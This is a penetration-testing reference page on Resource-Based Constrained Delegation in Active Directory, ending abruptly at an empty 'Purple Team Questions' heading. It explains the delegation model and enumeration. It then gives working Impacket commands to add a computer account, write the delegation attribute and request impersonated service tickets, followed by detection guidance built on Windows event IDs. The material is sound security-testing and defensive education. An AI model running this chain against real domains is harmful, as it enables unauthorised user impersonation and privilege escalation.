# Resource-Based Constrained Delegation

Resource-Based Constrained Delegation (RBCD) is a Kerberos delegation model in Active Directory where the **target resource controls which security principals are permitted to delegate authentication to it**.

This is the key difference from traditional Kerberos Constrained Delegation (KCD).

Traditional constrained delegation:

```text
Front-End Service
       |
       v
msDS-AllowedToDelegateTo
       |
       v
Which backend services
may I delegate to?
```

Resource-Based Constrained Delegation:

```text
Back-End Resource
       |
       v
msDS-AllowedToActOnBehalfOfOtherIdentity
       |
       v
Which principals may
delegate authentication to me?
```

The trust direction is therefore reversed.

A simplified RBCD architecture is:

```text
User
 |
 v
Front-End Service
 |
 | Kerberos S4U
 v
Back-End Server
 |
 v
Resource decides whether
front-end principal is trusted
```

The important Active Directory attribute is:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Unlike `msDS-AllowedToDelegateTo`, this attribute contains a security descriptor identifying the principals permitted to act on behalf of users toward the resource.

RBCD is legitimate Windows functionality and is commonly useful in modern delegation scenarios, particularly where administrators of a backend resource need to control delegation without requiring broad domain-level administration.

From a security-testing perspective, RBCD becomes particularly important when an attacker can modify the target computer object's delegation configuration.

A common attack-path model is:

```text
Attacker
   |
   v
Controls Principal A
   |
   +
Can modify Computer B
   |
   v
Configure Computer B to trust A
for RBCD
   |
   v
Authenticate as Principal A
   |
   v
Kerberos S4U
   |
   v
Impersonate User to Service on B
```

Therefore, RBCD analysis should combine:

```text
Delegation Configuration
        +
ACL Analysis
        +
Principal Control
        +
Kerberos S4U
        +
Target-Service Privileges
```

!!! warning "Authorised testing only"
    RBCD validation can involve modifying Active Directory objects and impersonating users. These actions can affect authentication and production systems. Only modify delegation attributes where the engagement explicitly permits Active Directory changes. Prefer existing RBCD relationships, ACL analysis, and dedicated test objects where possible. Record the original attribute value before any authorised modification and restore the exact original state during cleanup.

---

# Delegation Models

The major Kerberos delegation models are:

```text
Kerberos Delegation
       |
       +--> Unconstrained Delegation
       |
       +--> Constrained Delegation
       |
       +--> Resource-Based
            Constrained Delegation
```

A high-level comparison is:

| Property | Unconstrained | Traditional KCD | RBCD |
|---|---|---|---|
| Scope | Broad | Specific services | Specific trusted principals |
| Trust configured on | Front-end | Front-end | Back-end |
| Main attribute | `TRUSTED_FOR_DELEGATION` | `msDS-AllowedToDelegateTo` | `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| S4U relevant | Not central | Yes | Yes |
| Resource controls trust | No | No | Yes |
| ACL analysis important | Yes | Yes | Critical |

---

# Why RBCD Exists

Traditional constrained delegation requires configuration on the front-end principal.

Consider:

```text
WEB01
 |
 v
SQL01
```

Traditional KCD configures:

```text
WEB01
 |
 v
msDS-AllowedToDelegateTo
 |
 v
MSSQLSvc/SQL01
```

This means:

```text
WEB01 decides
where it may delegate
```

RBCD changes the administrative model.

```text
SQL01
 |
 v
msDS-AllowedToActOnBehalfOfOtherIdentity
 |
 v
WEB01
```

Now:

```text
SQL01 decides
who may delegate to it
```

This allows resource administrators to manage delegation relationships involving resources they control.

---

# Core RBCD Model

The basic relationship is:

```text
          Front-End Principal
                  |
                  v
              Kerberos
                  |
                  v
          Back-End Resource
                  |
                  v
msDS-AllowedToActOnBehalfOfOtherIdentity
                  |
                  v
          Security Descriptor
                  |
                  v
       Is Front-End Trusted?
             /         \
           No           Yes
           |             |
           X             v
                     Delegation
```

---

# Important Attribute

RBCD is configured through:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

The attribute exists on the resource being delegated to.

Usually this is a:

```text
Computer Object
```

For example:

```text
CN=SERVER01,
OU=Servers,
DC=corp,
DC=example
```

The conceptual configuration is:

```text
SERVER01$
   |
   v
msDS-AllowedToActOnBehalfOfOtherIdentity
   |
   v
Security Descriptor
   |
   +--> WEB01$
   |
   +--> svc_app
```

This means those principals may potentially use RBCD toward the resource according to the Kerberos delegation rules.

---

# Security Descriptor

A major difference from traditional KCD is that:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

is not simply a list of SPN strings.

It contains a:

```text
Security Descriptor
```

Conceptually:

```text
RBCD Attribute
      |
      v
Security Descriptor
      |
      v
ACE(s)
      |
      v
SID(s)
      |
      v
Trusted Principal(s)
```

Therefore, RBCD enumeration frequently requires resolving:

```text
SID
 |
 v
Active Directory Principal
```

---

# Trust Direction

This distinction should be memorised.

Traditional KCD:

```text
Front-End
   |
   v
"I may delegate to SQL01"
```

RBCD:

```text
SQL01
 |
 v
"WEB01 may delegate to me"
```

Another useful model is:

```text
Traditional KCD

Delegator ----------------> Resource
   |
   v
Configuration stored here
```

versus:

```text
RBCD

Delegator ----------------> Resource
                              |
                              v
                       Configuration
                       stored here
```

---

# RBCD and S4U

RBCD relies on Kerberos Service-for-User functionality.

The important operations are:

```text
S4U2Self
```

and:

```text
S4U2Proxy
```

The general flow is:

```text
Controlled Principal
       |
       v
Authenticate to KDC
       |
       v
S4U2Self
       |
       v
Service Ticket Representing User
       |
       v
S4U2Proxy
       |
       v
Target Service
       |
       v
RBCD Permission Checked
```

---

# S4U2Self

S4U2Self allows a service to request a service ticket to itself representing another user.

Conceptually:

```text
SERVICE01$
    |
    | "Give me a ticket to myself
    | representing Alice"
    v
   KDC
    |
    v
Alice -> SERVICE01
```

---

# S4U2Proxy

S4U2Proxy is used to request a service ticket to another service while representing the user.

```text
Alice -> SERVICE01
       |
       v
    SERVICE01
       |
       | S4U2Proxy
       v
      KDC
       |
       v
Alice -> SERVER01
```

With RBCD, the KDC evaluates whether:

```text
SERVICE01
```

is authorised by the resource-side:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

configuration.

---

# Simplified RBCD Flow

```text
Attacker-Controlled Principal
           |
           v
          KDC
           |
           | S4U2Self
           v
Ticket Representing Target User
           |
           | S4U2Proxy
           v
          KDC
           |
           v
Target Service Ticket
           |
           v
       SERVER01
```

The key authorisation question is:

```text
Does SERVER01 trust the
controlled principal for RBCD?
```

---

# Why RBCD Matters During Assessments

RBCD frequently appears in Active Directory privilege-escalation paths because delegation configuration is controlled through an attribute on the target object.

If an attacker has sufficient write permissions over a computer object:

```text
Attacker
   |
   v
Write Access to SERVER01$
   |
   v
Modify RBCD Attribute
   |
   v
Trust Attacker-Controlled Principal
   |
   v
S4U
   |
   v
Impersonate User
   |
   v
Service on SERVER01
```

This creates a strong relationship between:

```text
ACL Abuse
```

and:

```text
Kerberos Delegation
```

---

# RBCD Is Usually an Attack Chain

Finding:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

does not automatically mean an attacker can compromise the target.

Likewise:

```text
GenericWrite over SERVER01$
```

does not by itself prove RBCD exploitation.

The complete chain typically requires:

```text
Write Capability
       +
Controlled Principal
       +
Principal Authentication Material
       +
Kerberos Connectivity
       +
Suitable Target Service
       +
Impersonatable User
```

---

# Required Components

A typical RBCD abuse path requires several components.

```text
1. Target Resource
2. Write Capability over Resource
3. Controlled Security Principal
4. Authentication Material for Principal
5. Kerberos / KDC Access
6. Suitable SPN / Service
7. User to Represent
```

Each component should be validated separately.

---

# Target Resource

The target is commonly a computer object such as:

```text
SERVER01$
```

which corresponds to:

```text
SERVER01.corp.example
```

The computer normally has SPNs such as:

```text
HOST/SERVER01
HOST/SERVER01.corp.example
RestrictedKrbHost/SERVER01
RestrictedKrbHost/SERVER01.corp.example
```

and potentially service-specific SPNs.

---

# Controlled Principal

The delegating principal must be a security principal that can authenticate using Kerberos.

Common examples include:

```text
Computer Account
Service Account
User Account with suitable SPN context
```

A computer account is frequently used in RBCD testing because computer accounts naturally possess Kerberos keys and SPNs.

---

# Machine Account Quota

Historically, many Active Directory environments allow authenticated users to create a limited number of computer objects through:

```text
ms-DS-MachineAccountQuota
```

The default value in many domains has historically been:

```text
10
```

but this is configurable and should never be assumed.

Check the actual domain value.

---

# Enumerate Machine Account Quota

PowerShell:

```powershell
Get-ADDomain |
    Select-Object DNSRoot,DistinguishedName,ms-DS-MachineAccountQuota
```

If the property is not displayed directly:

```powershell
Get-ADObject \
    -Identity (Get-ADDomain).DistinguishedName \
    -Properties ms-DS-MachineAccountQuota |
    Select-Object \
        DistinguishedName,
        ms-DS-MachineAccountQuota
```

---

# LDAP Machine Account Quota

From Linux:

```bash
ldapsearch \
    -x \
    -H ldap://dc01.corp.example \
    -D 'CORP\alice' \
    -W \
    -b 'DC=corp,DC=example' \
    -s base \
    '(objectClass=*)' \
    ms-DS-MachineAccountQuota
```

Example result:

```text
ms-DS-MachineAccountQuota: 10
```

This means the domain permits computer creation according to the configured quota and applicable permissions.

It does **not** mean every authenticated user necessarily has an exploitable RBCD path.

---

# Machine Account Quota Is Not RBCD

Keep these concepts separate.

```text
Machine Account Quota
        |
        v
Potential ability to create
a computer principal
```

RBCD:

```text
Write Access to Target
        |
        v
Configure target to trust
a principal
```

The combination can be useful:

```text
Create Computer Principal
          +
Write RBCD on Target
          |
          v
Potential RBCD Path
```

but either condition alone may be insufficient.

---

# Enumeration Strategy

A complete enumeration model is:

```text
Active Directory
       |
       v
Find Existing RBCD
       |
       +
Find Writable Computers
       |
       +
Determine Machine Account Quota
       |
       +
Identify Controlled Principals
       |
       v
Resolve Target SPNs
       |
       v
Analyse User Privileges
       |
       v
Build Attack Paths
```

---

# Existing RBCD Relationships

Start by identifying resources that already have:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

configured.

This is useful because an existing relationship may provide a delegation path without modifying Active Directory.

---

# Windows - Active Directory PowerShell

Search computer objects containing the RBCD attribute:

```powershell
Get-ADComputer \
    -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
    -Properties DNSHostName,msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select-Object \
        Name,
        DNSHostName,
        msDS-AllowedToActOnBehalfOfOtherIdentity
```

A broader search can use:

```powershell
Get-ADObject \
    -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
    -Properties samAccountName,objectClass,msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select-Object \
        samAccountName,
        objectClass,
        msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

# Inspect One Computer

```powershell
Get-ADComputer \
    -Identity 'SERVER01' \
    -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select-Object \
        Name,
        msDS-AllowedToActOnBehalfOfOtherIdentity
```

The raw attribute may not be human-friendly because it contains a security descriptor.

---

# Resolve the Security Descriptor

The RBCD security descriptor can be parsed to identify trusted SIDs.

A PowerShell workflow can inspect the raw value and translate SIDs to account names.

For example:

```powershell
$computer = Get-ADComputer \
    -Identity 'SERVER01' \
    -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

$raw = $computer.'msDS-AllowedToActOnBehalfOfOtherIdentity'

$sd = New-Object System.Security.AccessControl.RawSecurityDescriptor(
    $raw,
    0
)

$sd.DiscretionaryAcl |
    ForEach-Object {
        $_.SecurityIdentifier.Translate(
            [System.Security.Principal.NTAccount]
        )
    }
```

Use this for enumeration and evidence collection rather than manually interpreting binary attribute data.

---

# ldapsearch

Search for resources with RBCD configured:

```bash
ldapsearch \
    -x \
    -H ldap://dc01.corp.example \
    -D 'CORP\alice' \
    -W \
    -b 'DC=corp,DC=example' \
    '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
    sAMAccountName \
    dNSHostName \
    objectSid \
    msDS-AllowedToActOnBehalfOfOtherIdentity
```

The attribute may be returned in encoded form because it contains binary security-descriptor data.

Specialised tooling is usually more convenient for resolving it.

---

# Impacket findDelegation

Impacket provides:

```text
findDelegation.py
```

commonly installed as:

```text
impacket-findDelegation
```

Check the current version:

```bash
impacket-findDelegation -h
```

A typical enumeration pattern is:

```bash
impacket-findDelegation \
    'corp.example/alice:<PASSWORD>' \
    -dc-ip 10.10.10.10
```

The tool can identify:

```text
Unconstrained Delegation
Constrained Delegation
RBCD
```

depending on the directory configuration.

---

# Interpreting RBCD Enumeration

For each relationship record:

```text
Delegating Principal
Target Resource
Delegation Type
Target SPNs
```

Then determine:

```text
Do we control the delegating principal?
```

If:

```text
No
```

the relationship may still be interesting but does not automatically provide an attack path.

If:

```text
Yes
```

analyse the resulting S4U capabilities.

---

# PowerView

PowerView can assist with:

```text
Computer Enumeration
ACL Enumeration
Object Ownership
Delegation Attributes
```

For direct RBCD enumeration, LDAP-backed queries are generally the clearest approach.

For example:

```powershell
Get-DomainComputer \
    -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
    -Properties samaccountname,dnshostname,msds-allowedtoactonbehalfofotheridentity
```

PowerView versions and forks vary, so check:

```powershell
Get-Help Get-DomainComputer -Full
```

before relying on version-specific convenience switches.

---

# BloodHound

BloodHound is one of the most valuable tools for RBCD analysis because RBCD is often an ACL-driven attack path.

The key question is:

```text
Who can modify the target computer?
```

A conceptual path is:

```text
Alice
 |
 v
GenericWrite
 |
 v
SERVER01$
 |
 v
RBCD Configuration
 |
 v
Controlled Principal
 |
 v
S4U
 |
 v
SERVER01
```

---

# ACL Relationships

Review rights such as:

```text
GenericAll
GenericWrite
WriteDACL
WriteOwner
WriteProperty
```

over the target computer object.

The exact right required depends on what attribute modifications the principal can actually perform.

Do not assume every write-like BloodHound edge means the same thing.

---

# GenericAll

Conceptually:

```text
Alice
 |
 v
GenericAll
 |
 v
SERVER01$
```

indicates broad control over the computer object.

This may permit modification of delegation-related attributes.

The resulting risk can become:

```text
Alice
 |
 v
Control SERVER01$ Object
 |
 v
Configure RBCD
 |
 v
Kerberos Impersonation Path
```

---

# GenericWrite

A relationship such as:

```text
Alice
 |
 v
GenericWrite
 |
 v
SERVER01$
```

also deserves investigation.

Validate whether the effective rights allow modification of:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

rather than assuming exploitation solely from the graph edge.

---

# WriteDACL

If an attacker controls:

```text
WriteDACL
```

the attacker may be able to modify the object's discretionary access control list and grant additional rights.

Conceptually:

```text
WriteDACL
   |
   v
Modify ACL
   |
   v
Grant Write Permission
   |
   v
Modify RBCD Attribute
```

This adds another stage to the attack chain.

---

# WriteOwner

Similarly:

```text
WriteOwner
```

may allow an attacker to become owner of the object and subsequently manipulate its permissions.

The path can be:

```text
WriteOwner
    |
    v
Take Ownership
    |
    v
Modify DACL
    |
    v
Gain Attribute Write
    |
    v
Configure RBCD
```

This is an ACL escalation chain rather than direct RBCD permission.

---

# Object Ownership

Always inspect:

```text
Owner
```

because an unexpected low-privileged owner of a sensitive computer object can create additional ACL-control possibilities.

---

# ACL Enumeration with PowerView

A general PowerView approach is:

```powershell
Get-DomainObjectAcl \
    -Identity 'SERVER01' \
    -ResolveGUIDs
```

Review the resulting entries carefully.

Look for:

```text
ActiveDirectoryRights
ObjectAceType
SecurityIdentifier
```

Resolve SIDs where required.

---

# Native PowerShell ACL Review

The Active Directory provider can also be used where available.

For example:

```powershell
$dn = (Get-ADComputer SERVER01).DistinguishedName
Get-Acl "AD:\$dn" | Format-List
```

This is useful for confirming ACL relationships independently of offensive tooling.

---

# Controlled Principal Analysis

Before active RBCD validation, determine:

```text
Do we already control a suitable principal?
```

Examples:

```text
Compromised Computer Account
Controlled Test Computer Account
Controlled Service Account
Dedicated Lab Principal
```

Prefer an existing dedicated test principal where possible.

---

# Creating Computer Accounts

Where the assessment explicitly permits Active Directory object creation and the domain policy allows it, a controlled computer account may be created for RBCD testing.

This should **not** be the default first step.

The workflow should be:

```text
Check Existing Principal
        |
        +--> Suitable? -> Use it
        |
        v
Check Machine Account Quota
        |
        v
Confirm AD Changes Are Authorised
        |
        v
Create Dedicated Test Computer
```

---

# Impacket addcomputer

Impacket includes:

```text
addcomputer.py
```

commonly installed as:

```text
impacket-addcomputer
```

Check current syntax:

```bash
impacket-addcomputer -h
```

In an explicitly authorised test environment, a general pattern is:

```bash
impacket-addcomputer \
    'corp.example/alice:<PASSWORD>' \
    -computer-name 'PT-RBCD$' \
    -computer-pass '<STRONG_RANDOM_PASSWORD>' \
    -dc-ip 10.10.10.10
```

Use a clearly identifiable test name.

Examples:

```text
PT-RBCD$
PENTEST-RBCD$
TEST-KRB01$
```

Do not create deceptively named computer accounts in production unless the engagement specifically requires that scenario.

---

# Record Created Objects

If a test object is created, record:

```text
sAMAccountName
Distinguished Name
SID
Password
Creation Time
Creator
Purpose
```

and include it in the cleanup plan.

---

# Machine Account Credential

A created computer account has authentication material.

Conceptually:

```text
PT-RBCD$
    |
    v
Password
    |
    v
Kerberos Keys
    |
    v
Can Authenticate
```

Protect the password and any derived keys as credentials.

---

# RBCD Configuration

The target resource must trust the controlled principal.

Conceptually:

```text
SERVER01$
    |
    v
msDS-AllowedToActOnBehalfOfOtherIdentity
    |
    v
PT-RBCD$
```

The resulting relationship is:

```text
PT-RBCD$
    |
    | May act on behalf of users
    v
SERVER01
```

---

# Impacket rbcd

Impacket provides:

```text
rbcd.py
```

commonly installed as:

```text
impacket-rbcd
```

Check the installed syntax first:

```bash
impacket-rbcd -h
```

The tool can read and, where authorised and permitted, modify RBCD configuration.

---

# Read Existing RBCD Configuration

Prefer reading before writing.

A typical pattern is:

```bash
impacket-rbcd \
    -delegate-to 'SERVER01$' \
    -action read \
    'corp.example/alice:<PASSWORD>'
```

Depending on DNS and environment requirements, specify the domain controller using the options supported by the installed version.

Check:

```bash
impacket-rbcd -h
```

---

# Controlled RBCD Write

Where the assessment explicitly permits modifying the target object's delegation configuration, the general Impacket pattern is:

```bash
impacket-rbcd \
    -delegate-from 'PT-RBCD$' \
    -delegate-to 'SERVER01$' \
    -action write \
    'corp.example/alice:<PASSWORD>'
```

This should only be attempted after confirming that:

```text
1. Target is in scope
2. AD modifications are permitted
3. Controlled principal is documented
4. Existing attribute value is recorded
5. Cleanup method is understood
```

---

# Read After Write

Immediately verify:

```bash
impacket-rbcd \
    -delegate-to 'SERVER01$' \
    -action read \
    'corp.example/alice:<PASSWORD>'
```

The objective is to confirm the intended relationship rather than making additional unnecessary changes.

---

# Important Cleanup Warning

Do not blindly use:

```text
clear
```

against a production RBCD attribute if legitimate principals existed before testing.

If the original configuration contained:

```text
WEB01$
APP01$
```

and testing adds:

```text
PT-RBCD$
```

cleanup must preserve:

```text
WEB01$
APP01$
```

while removing only the test relationship.

Always capture the original security descriptor or trusted-principal set before modification.

---

# RBCD Ticket Acquisition

Once a controlled principal is legitimately or test-authorised for RBCD, S4U can be used to request a service ticket representing another user to an appropriate service on the target.

The conceptual flow is:

```text
PT-RBCD$
   |
   v
Authenticate
   |
   v
S4U2Self
   |
   v
Represent Test User
   |
   v
S4U2Proxy
   |
   v
cifs/SERVER01
   |
   v
Service Ticket
```

---

# Impacket getST

Impacket provides:

```text
getST.py
```

commonly installed as:

```text
impacket-getST
```

Check:

```bash
impacket-getST -h
```

A controlled RBCD test pattern is:

```bash
impacket-getST \
    -spn 'cifs/server01.corp.example' \
    -impersonate '<TEST_USER>' \
    'corp.example/PT-RBCD$:<COMPUTER_PASSWORD>'
```

The exact command should always be verified against the installed Impacket version.

---

# Example Controlled Request

In a dedicated authorised lab:

```bash
impacket-getST \
    -spn 'cifs/server01.corp.example' \
    -impersonate 'pt-test-user' \
    'corp.example/PT-RBCD$:<COMPUTER_PASSWORD>'
```

A successful request may produce:

```text
pt-test-user@cifs_server01.corp.example@CORP.EXAMPLE.ccache
```

The exact filename may differ.

---

# Ticket Cache

Set the resulting credential cache:

```bash
export KRB5CCNAME="$PWD/<TICKET>.ccache"
```

Inspect it:

```bash
klist
```

Verify:

```text
Default principal
Service principal
Ticket lifetime
Realm
```

---

# Minimum-Impact Validation

Where the ticket targets:

```text
cifs/server01.corp.example
```

a minimum-impact validation may authenticate to SMB:

```bash
impacket-smbclient \
    -k \
    -no-pass \
    'corp.example/<TEST_USER>@server01.corp.example'
```

The goal is:

```text
RBCD Configuration
       |
       v
S4U Ticket
       |
       v
Authentication
       |
       v
Finding Proven
```

rather than immediately performing remote execution.

---

# Authentication vs Authorisation

Remember:

```text
Kerberos Ticket
      |
      v
Authentication
```

does not automatically mean:

```text
Administrative Access
```

The impersonated user's permissions still apply.

```text
Impersonated User
       |
       v
Target Service
       |
       v
Authorisation Check
       |
   +---+---+
   |       |
 Allow    Deny
```

---

# Target User Selection

Prefer:

```text
Dedicated Test User
```

where possible.

Only impersonate:

```text
Privileged Production User
```

when the engagement specifically requires demonstration of that impact and it is explicitly authorised.

---

# Sensitive Accounts

Accounts configured as:

```text
Account is sensitive and cannot be delegated
```

are protected from delegation.

The corresponding `userAccountControl` flag is:

```text
NOT_DELEGATED
```

with value:

```text
0x00100000
```

or:

```text
1048576
```

---

# Check AccountNotDelegated

PowerShell:

```powershell
Get-ADUser \
    -Identity '<USERNAME>' \
    -Properties AccountNotDelegated |
    Select-Object \
        SamAccountName,
        AccountNotDelegated
```

If:

```text
AccountNotDelegated = True
```

the account should not be treated as an ordinary delegation candidate.

---

# Protected Users

Suitable privileged identities may also belong to:

```text
Protected Users
```

which introduces additional authentication protections.

During testing, a failure involving a Protected Users member may be expected and should not be "fixed" by weakening the user's security controls.

---

# Service Principal Selection

The requested service ticket must correspond to an appropriate SPN.

Examples:

```text
cifs/server01.corp.example
http/server01.corp.example
ldap/server01.corp.example
MSSQLSvc/server01.corp.example:1433
```

The service class matters.

---

# Enumerate Target SPNs

From Windows:

```powershell
setspn -L SERVER01
```

Search a specific SPN:

```powershell
setspn -Q cifs/server01.corp.example
```

Using PowerShell:

```powershell
Get-ADComputer \
    -Identity 'SERVER01' \
    -Properties ServicePrincipalName |
    Select-Object \
        Name,
        ServicePrincipalName
```

---

# SPN and Hostname

Kerberos is identity-sensitive.

Prefer:

```text
server01.corp.example
```

rather than:

```text
10.10.10.25
```

when using a ticket issued for:

```text
cifs/server01.corp.example
```

---

# DNS

Verify:

```bash
getent hosts server01.corp.example
```

and:

```bash
getent hosts dc01.corp.example
```

Incorrect DNS frequently causes Kerberos workflows to fail.

---

# Time

Kerberos is time-sensitive.

Linux:

```bash
date
```

Windows:

```powershell
w32tm /query /status
```

Do not modify production domain time configuration to make a test work.

---

# RBCD with Existing Controlled Computer

If an already-compromised computer account is suitable:

```text
COMPROMISED01$
```

there may be no reason to create another computer account.

The path becomes:

```text
Control COMPROMISED01$
          |
          +
Write SERVER01$
          |
          v
Configure RBCD
          |
          v
S4U
          |
          v
SERVER01
```

This is preferable from a change-minimisation perspective.

---

# RBCD with Service Account

A controlled service principal may also participate in delegation depending on the environment and Kerberos configuration.

The important requirement is not:

```text
Must always be computer account
```

but rather:

```text
Controlled Kerberos Principal
```

with the necessary characteristics for the intended workflow.

---

# RBCD and Machine Account Quota

A classic RBCD chain is:

```text
Authenticated User
       |
       v
MachineAccountQuota > 0
       |
       v
Create Computer
       |
       v
Control Computer Credential
       |
       +
Write Access to SERVER01$
       |
       v
Configure RBCD
       |
       v
S4U
       |
       v
Impersonate User to SERVER01
```

This is a chain of separate security conditions.

---

# Do Not Report MachineAccountQuota Alone as RBCD

Avoid:

```text
MachineAccountQuota = 10
        |
        v
Critical RBCD Vulnerability
```

This is inaccurate.

Instead determine:

```text
Can user create principal?
        |
        +
Can user modify target RBCD?
        |
        +
Does target expose useful service?
        |
        +
Can relevant identity be represented?
        |
        v
Practical RBCD Path
```

---

# RBCD and ACL Abuse

RBCD is closely related to Active Directory ACL abuse.

Common relationships worth investigating include:

```text
GenericAll
GenericWrite
WriteProperty
WriteDACL
WriteOwner
```

The exact effective permission should be validated.

Future detailed ACL notes:

```text
active-directory/acl-ace.md
```

---

# RBCD and Computer Object Ownership

Computer object ownership can become important because owners may be able to influence the object's security descriptor.

A complete assessment should therefore inspect:

```text
Owner
DACL
Explicit ACEs
Inherited ACEs
```

rather than checking only one BloodHound edge.

---

# RBCD and Traditional Constrained Delegation

Traditional KCD:

```text
WEB01$
 |
 v
msDS-AllowedToDelegateTo
 |
 v
cifs/SERVER01
```

RBCD:

```text
SERVER01$
 |
 v
msDS-AllowedToActOnBehalfOfOtherIdentity
 |
 v
WEB01$
```

The direction is:

```text
KCD:
Delegator -> Destination


RBCD:
Destination -> Trusted Delegator
```

For traditional KCD:

[Constrained Delegation](constrained-delegation.md)

---

# RBCD vs Unconstrained Delegation

Unconstrained delegation provides broad delegation capability.

```text
Unconstrained
     |
     v
Broad Delegation
```

RBCD:

```text
RBCD
 |
 v
Resource-Specific Trust
```

RBCD does not involve the same broad credential exposure model as unconstrained delegation.

For detailed coverage:

[Unconstrained Delegation](unconstrained-delegation.md)

---

# RBCD vs Pass-the-Ticket

RBCD is a mechanism used to obtain an impersonated service ticket.

```text
RBCD
 |
 v
S4U
 |
 v
Service Ticket
```

Pass-the-Ticket begins with a ticket that already exists:

```text
Existing Ticket
      |
      v
Pass-the-Ticket
```

See:

[Pass-the-Ticket](pass-the-ticket.md)

---

# RBCD vs Pass-the-Key

Pass-the-Key begins with:

```text
Kerberos Key Material
```

RBCD is:

```text
Delegation Authorisation
```

A controlled account key may authenticate the RBCD delegating principal, but the concepts are separate.

See:

[Pass-the-Key](pass-the-key.md)

---

# RBCD vs Kerberoasting

Kerberoasting:

```text
SPN
 |
 v
Request Service Ticket
 |
 v
Offline Password Guessing
```

RBCD:

```text
Controlled Principal
 |
 v
S4U
 |
 v
Impersonated Service Ticket
```

See:

[Kerberoasting](kerberoasting.md)

---

# RBCD vs Shadow Credentials

Both techniques can appear after gaining write permissions over an Active Directory object, but they modify different security mechanisms.

RBCD:

```text
Write Target Object
       |
       v
Delegation Attribute
       |
       v
S4U Impersonation
```

Shadow Credentials:

```text
Write Target Object
       |
       v
Key Credential Attribute
       |
       v
Certificate-Based Authentication
```

Do not conflate the two.

Future detailed coverage:

```text
active-directory/shadow-credentials.md
```

---

# RBCD vs Password Reset

If an attacker already has the ability to reset a target account's password, RBCD may not always be the most appropriate validation path.

Choose the technique that:

```text
Best demonstrates the finding
        +
Minimises impact
        +
Preserves service availability
```

Do not modify additional attributes merely because a technique is possible.

---

# Detection

Detection should cover both:

```text
RBCD Configuration Changes
```

and:

```text
Kerberos Delegation Activity
```

A complete model is:

```text
Directory Monitoring
       |
       +--> RBCD attribute changes
       |
       +--> Computer creation
       |
       +--> ACL changes
       |
       v
Kerberos Monitoring
       |
       +--> TGT requests
       |
       +--> Service-ticket requests
       |
       v
Endpoint Monitoring
       |
       +--> Resulting access
       |
       +--> Suspicious tooling
```

---

# Event 5136

Where Directory Service Changes auditing is configured, Active Directory object modifications may generate:

```text
5136
```

This is highly relevant to RBCD because the technique may involve modifying:

```text
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Monitor:

```text
Object DN
Attribute LDAP Display Name
Operation Type
Subject
Value
```

---

# RBCD Attribute Monitoring

A high-value detection rule is:

```text
5136
  |
  v
Attribute:
msDS-AllowedToActOnBehalfOfOtherIdentity
  |
  v
Investigate
```

Ask:

```text
Who made the change?

Which resource changed?

Which SID was added?

Was the change approved?

Was a new computer created beforehand?

Did S4U activity follow?
```

---

# Event 4741

Creation of a computer account can generate:

```text
4741
```

when the relevant auditing is enabled.

This can be useful for identifying an RBCD chain involving:

```text
MachineAccountQuota
       |
       v
New Computer
       |
       v
RBCD
```

---

# Event 4742

Changes to a computer account can generate:

```text
4742
```

depending on the modification and audit configuration.

Use it as supporting context rather than assuming every RBCD attribute modification will be fully represented by this event alone.

---

# Event 4768

Event:

```text
4768
```

records Kerberos TGT requests.

A newly created or unusual computer principal requesting a TGT shortly after creation can be useful context.

---

# Event 4769

Event:

```text
4769
```

records Kerberos service-ticket requests.

This is central to detecting S4U-related service-ticket activity.

Analyse:

```text
Account
Service Name
Client Address
Ticket Options
Ticket Encryption Type
Time
```

and correlate it with directory changes.

---

# Event 4624

Successful authentication to the target Windows service may generate:

```text
4624
```

Correlate:

```text
5136
 |
 v
RBCD Change
 |
 v
4768 / 4769
 |
 v
4624
```

where telemetry permits.

---

# Event 4672

If the represented identity receives privileged rights on the target:

```text
4672
```

may provide additional context.

It is not RBCD-specific.

---

# Detection Chain

A particularly useful detection model is:

```text
4741
New Computer Created
       |
       v
5136
RBCD Attribute Modified
       |
       v
4768
Computer Requests TGT
       |
       v
4769
S4U / Service Ticket
       |
       v
4624
Target Authentication
```

Not every RBCD event chain contains all of these events.

For example:

```text
Existing Controlled Principal
```

means there may be no:

```text
4741
```

event.

---

# Baseline Existing RBCD

Maintain an inventory such as:

```text
Resource      Trusted Principal       Purpose
-------------------------------------------------------
SQL01$        WEB01$                  Web application
FILE01$       APP01$                  Legacy application
```

Unexpected additions should be reviewed.

---

# Monitor Computer Creation

If:

```text
ms-DS-MachineAccountQuota
```

is greater than zero, monitor unusual computer creation by ordinary user accounts.

A normal workstation deployment account may create computers routinely.

A random user account doing so may deserve investigation.

Context is essential.

---

# Monitor ACL Changes

Because RBCD abuse can depend on object write access, monitor sensitive computer-object ACL changes.

Relevant activity includes changes that grant:

```text
GenericAll
GenericWrite
WriteDACL
WriteOwner
WriteProperty
```

to unexpected principals.

---

# Behavioural Correlation

RBCD uses legitimate Kerberos functionality.

Therefore:

```text
4769
 |
 X
Proof of RBCD Abuse
```

A stronger signal is:

```text
Unexpected AD Change
        +
Unexpected Delegating Principal
        +
S4U Activity
        +
Sensitive Target
        +
Unexpected Authentication
```

---

# Endpoint Telemetry

Depending on the testing implementation, endpoint telemetry may identify:

```text
PowerShell
Rubeus
Impacket-related network activity
Unexpected Kerberos ticket use
Remote administration
Suspicious child processes
```

Do not depend solely on tool-name detection.

Attackers can implement the same protocols without using common public tools.

---

# Purple Team Exercise

A controlled RBCD exercise can be structured as:

```text
Dedicated Test User
       |
       v
Dedicated Test Computer
       |
       v
Authorised RBCD Modification
       |
       v
S4U Ticket Request
       |
       v
Authentication to Test Server
       |
       v
Blue Team Investigation
```

This allows testing:

```text
Directory Change Detection
Kerberos Detection
Endpoint Detection
Identity Investigation
```

without using production administrator identities.

---

# Purple Team Questions

